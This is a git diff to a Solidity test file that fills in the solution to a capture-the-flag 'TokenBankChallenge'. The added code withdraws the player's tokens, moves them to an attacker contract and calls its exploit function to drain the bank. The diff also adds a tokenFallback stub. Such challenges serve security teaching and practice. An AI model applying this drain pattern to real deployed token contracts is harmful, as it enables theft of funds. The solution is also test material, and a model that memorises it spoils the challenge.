@@ -16,6 +16,16 @@ contract TankBankTest is Test {
         tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));
 
         // Put your solution here
+        // withdraw player balance
+        tokenBankChallenge.withdraw(500_000 * 1 ether);
+        assert(tokenBankChallenge.token().balanceOf(address(this)) == 500_000 * 1 ether);
+
+        // send balance to attacker contract
+        tokenBankChallenge.token().transfer(address(tokenBankAttacker), 500_000 * 1 ether);
+
+        // execute exploit
+        tokenBankAttacker.exploit(player);
+        assert(tokenBankChallenge.token().balanceOf(address(player)) == 1_000_000 * 1 ether);
 
         _checkSolved();
     }
@@ -23,4 +33,6 @@ contract TankBankTest is Test {
     function _checkSolved() internal {
         assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
     }
+
+    function tokenFallback(address, uint256, bytes memory) public {}
 }
